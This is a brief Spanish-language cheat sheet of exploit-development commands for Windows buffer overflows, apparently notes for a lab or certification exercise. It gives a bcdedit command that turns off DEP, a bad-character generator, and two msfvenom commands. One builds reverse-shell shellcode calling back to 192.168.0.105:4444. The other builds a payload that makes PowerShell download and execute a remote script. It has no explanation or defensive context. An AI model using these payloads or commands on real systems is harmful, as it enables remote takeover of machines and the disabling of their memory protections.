
## Desactivar DEP
```
bcdedit.exe /set {current} nx AlwaysOff
```

## BYTEARRAY
```pip install badchars```
```badchars -f python```

## SHELLCODE
#### cmd
```msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c```
#### Powershell
```msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.105:8000/PS.ps1')" lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c```

#### Idioma teclado
ES Spanish (United States)
